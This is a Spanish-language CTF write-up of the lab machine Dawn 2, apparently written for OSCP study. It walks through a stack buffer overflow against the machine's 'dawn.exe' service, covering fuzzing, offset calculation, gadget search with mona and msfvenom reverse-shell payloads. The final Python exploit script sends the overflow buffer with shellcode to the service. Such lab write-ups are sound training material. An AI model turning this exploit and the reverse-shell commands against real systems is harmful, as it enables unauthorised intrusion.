---
layout: single
title:  "Dawn 2: Vanilla Buffer Overflow"
date:   2021-07-21 16:54:50 -0500
categories: ctf
tags: oscp
permalink: /:categories/:title/

header:
  overlay_image: /images/cloudflare1/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7)
  actions:
     - label: "View Code"
       url: "https://github.com/alexfrancow"
  
---

Dawn 2 es una máquina desarrollada por [@whitecr0wz](https://www.vulnhub.com/author/whitecr0wz,630/) que está disponible en vulnhub y que recientemente se ha añadido en [https://portal.offensive-security.com/proving-grounds/play](https://portal.offensive-security.com/proving-grounds/play), la máquina cuenta con un nivel de dificultad intermedia. 

> El link de descarga: [https://www.vulnhub.com/entry/sunset-dawn2,424/](https://www.vulnhub.com/entry/sunset-dawn2,424/)

## Recon
Una vez iniciada la máquina se lanza un `nmap` contra la máquina, descubriendo aqui, un puerto 80 HTTP; que mostrará un link de descarga de un binario `PE32 executable (console) Intel 80386, for MS Windows`, y un puerto 1985 donde el mismo se encuentra a la escucha.

```bash
$ nmap -sC -sV -v -oA nmap/nmap 192.168.58.12
# Nmap 7.91 scan initiated Wed Jul 14 19:20:39 2021 as: nmap -sC -sV -v -oA nmap/nmap 192.168.58.12
Nmap scan report for 192.168.58.12
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT     STATE    SERVICE VERSION
80/tcp   open     http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
1985/tcp filtered dproxy

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 14 19:21:14 2021 -- 1 IP address (1 host up) scanned in 35.20 seconds
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714193940.png" height="500" width="825" /></p>

## Preparación entorno

Uno de los primeros pasos para examinar el binario es la preparación de un entorno, el cual consistirá en lavantar una máquina Windows 7 de 32 bits e instalar Immunity Debbuger con Mona (un script en Python que ayudará en la labor de debbuging).
> En este writeup no se verán métodos de bypass ya que se deshabilitaran protecciones del sistema como; el Data Execution Prevention (DEP) o el Address Space Layout Randomization(ASLR). 

```bash
bcdedit.exe /set {current} nx AlwaysOff
```

> La instalación de la máquina y su configuración dado que se salen del scope de esta entrada, serán omitidos.

Una vez instalado Immunity debbuger con python2.7 [https://www.immunityinc.com/products/debugger/](https://www.immunityinc.com/products/debugger/), se instalará mona:

```bash
git clone https://github.com/corelan/mona
cp mona/mona.py C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\mona.py
```

Para comprobar que se ha instalado correctamente es posible hacer uso del comando:
```bash
!mona
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714195240.png" height="500" width="825" /></p>

Para comprobar que funciona correctamente, se abrirá el binario con Immunity Debbuger y se lanzará una conexión con netcat para, de esta manera, establecer una conexión contra el servicio.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714194220.png" height="500" width="825" /></p>
<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714194245.png" height="500" width="825" /></p>
<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714194347.png" height="500" width="825" /></p>

> En las screenshots aparecerá OllyDbg, pero se sigue el mismo procedimiento.

## Buffer Overflow
Antes de comenzar con la explotación de la máquina es importante leer el README.md que se adjunta, para no perder todo el día tratando de depurar el payload.

```
DAWN Multi Server - Version 1.1

Important:

Due the lack of implementation of the Dawn client, many issues may be experienced, such as the message not being delivered. In order to make sure the connection is finished and the message well received, send a NULL-byte at the ending of your message. 
Also, the service may crash after several requests.

Sorry for the inconvenience!
```

### Crashing the service

Una vez se conoce la importancia de añadir un NULL-byte (\x00) al final del payload se podrá empezar con el fuzzing y comprobar en que momento el servicio 'crashea'.

A modo de ejemplo se hace un envio de 800 'A's.

```bash
python2.7 -c "print('A'*800+'\x00')" | nc 192.168.1.88 1985
```

> Python2.7 las envía como bytes por defecto, pero en python3 hay que definirlo (b"A" * 410).

Una vez enviados los bytes se observa que el EIP se sobreescribe con \x41\x41\x41\x41, las 'A's. El programa se corrompe ya que la siguiente instrucción que será ejecutada no existe en la memoria.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721164642.png" height="500" width="825" /></p>

### Getting the offset
El offset el la cantidad de caracteres que se deben enviar antes de sobreescribir el `EIP`. 

¿Por qué no interesa sobreescribir dicho registro?

El hecho de desbordar el buffer hará sobreescribir algunos registros que no deberían estar siendo almacenados con los valores que nosotros le enviamos.
El sobrescribir el registro EIP nos hará crashear la aplicación, ya que el programa no será capaz de redirigir bien el flujo, y apuntará a una siguiente dirección de memoria que no existe (0x41414141 = AAAA) dando por resultado la corrupción del programa.

En este punto es interesante encontrar en que momento se está sobrescribiendo el EIP, de esta manera se conocerá el tamaño exacto de buffer que será necesario rellenar con basura ("A" * x) para que en los siguientes caracteres que empezarán a sobrescribir el EIP se pueda redirigir el flujo hacia otra función.

¿Cómo se calcula el offset?

Para calcular el offset se puede hacer uso de un script llamado `msf-pattern_create` que generará una cadena compuesta de patrones únicos que se pueden emplear para reemplazar la secuencia de 'A's, de modo que el registro EIP será sobreescrito por un conjunto de 4 bytes que aparecerán una unica vez en todo el patrón y este se podrá localizar fácilmente.

Sabiendo el número de bytes que rompe el servicio, en este caso (<>800), se creará el siguiente `pattern`:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9..snip..
```

Para enviarlo se puede hacer un pipe con netcat como anteriormente y asi simplificar el envio en lugar de crear un socket con el propio python, que por supuesto, se verá más adelante.

```bash
python2.7 -c "print('$(msf-pattern_create -l 800)'+'\x00')" | nc 192.168.1.88 1985
```

En este caso el EIP no se sobreescribe con las 'A's, sino que se sobreescribe con el valor 316A4130, con eso se procederá a calcular el offset. Haciendo uso de la utilidad `msf-pattern_offset` queda como resultado que el offset = 272.

```bash
msf-pattern_offset -l 800 -q 316A4130
[*] Exact match at offset 272
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721170311.png" height="500" width="825" /></p>

### Push ESP

Una vez que se conoce cual es el byte justo que empieza a sobreescribir el EIP, se podrá redirigir todo el flujo del programa a la dirección de memoria deseada y de esta manera ejecutar código.

Hay varias formas de lograrlo. Sin embargo, lo más común es encontrar una instrucción JMP ESP, que saltará a la parte superior del Stack Frame, cambiando la ubicación de EIP a la parte superior del puntero ESP y ejecutando todo lo que se envíe después de eso. Otras instrucciones como CALL ESP o PUSH ESP también deberían funcionar.

Para esta parte, mona ofrece un comando para la búsqueda de instrucciones JMP o CALL.

```c
!mona jmp -r esp
[+] Results :
0x345964ba : call esp |  {PAGE_EXECUTE_READ} [dawn.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\alexfrancow\Desktop\ExploitingServices\dawn\dawn.exe)
0x34581777 : push esp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [dawn.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\alexfrancow\Desktop\ExploitingServices\dawn\dawn.exe)
```

Es necesario escoger un módulo que no tenga múltiples protecciones y que tenga una dirección base sin bad-chars.

En este caso se utilizará la 0x34581777, pero antes de probar a enviar el payload:

```bash
python2.7 -c "print('A'*272+'\x77\x17\x58\x34'+'\x00')" | nc 192.168.1.88 1985
```

Se colocará un breakpoint en esa misma dirección para ver que el programa se está redirigiendo hacia ella.

Con el atajo `Ctrl+G` se va hacia la dirección en memoria de la función:
<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721171129.png" height="500" width="825" /></p>

Una vez en ella se añade un segundo breakpoint y seguimos el flujo del programa dandole al play `F9`.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721171251.png" height="500" width="825" /></p>

Se envia el payload y, efectivamente, despues de llenar de basura con 'A's el stack cae en la funcion a la que se le ha dirigido, sobreescribiendo asi el EIP.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721171402.png" height="500" width="825" /></p>

El siguiente paso a realizar será la creación de la shellcode, en este caso una calculadora, para generarla simplemente se hará uso de msfvenom:

```bash
msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b '\x00'
```

Aunque también se podrá generar una shell reversa por TCP y de esta manera tomar control de la máquina:

```bash
msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=192.168.1.99 LPORT=9001 -f c -b '\x00 EXITFUNC=thread'
```
> Se utiliza la opción EXITFUNC=thread, esto significa que el código de shell se generará como un hilo remoto en lugar de generar desde el flujo de código original, evitando que el programa se bloquee al finalizar la ejecución.

De esta manera se podrá desarrollar el exploit final. También será necesario añadir instrucciones adicionales de NoP (\x90) que se analizarán después del PUSH ESP, estas instrucciones básicamente dicen: "ir a la siguiente instrucción". Se agregan estos para que la carga útil no se mezcle con otras instrucciones, corrompiéndola:

```python
import socket, sys, struct

shell = ("\x60\xf7\x4f\x62\x59\x83\x4d\x88\x24\x06\x39\xe9\xc9\x9c\x8c"
..snip..
"\x18\x60\x23\x8c\x4b")
buffer = "A"*272 + "\x77\x17\x58\x34"  + "\x90"*20 + shell + "\x00"
# \x77\x17\x58\x34 = 0x34581777

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.88", 1985))
print("Sending payload")
s.send(buffer)
s.close()
```
<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721201618.png" height="500" width="825" /></p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/Y8cRUK7jky4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

Se puede utilizar el módulo struct para convertir el valor HEX en little-endian y no tener que reversear la dirección poniendola en hexadecimal manualmente:
> Documentación de la librería struct: [https://docs.python.org/3/library/struct.html](https://docs.python.org/3/library/struct.html)

```python
pushesp = struct.pack("<I", 0x34581777)
buffer = "A"*272 + pushesp + "\x90"*20 + shell + "\x00"
```

## Explotación de la máquina

En la máquina del CTF se hará uso de una reverse shell en Linux que será necesario generar y modificar en el exploit.

```python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.186 LPORT=9001 -f c -b '\x00 EXITFUNC=thread'
```

Una vez ejecutado, se puede observar que desde el netcat se recibe la shell de la máquina, dandonos acceso a la misma.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721174535.png" height="500" width="825" /></p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/QPCWxrSKUjw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
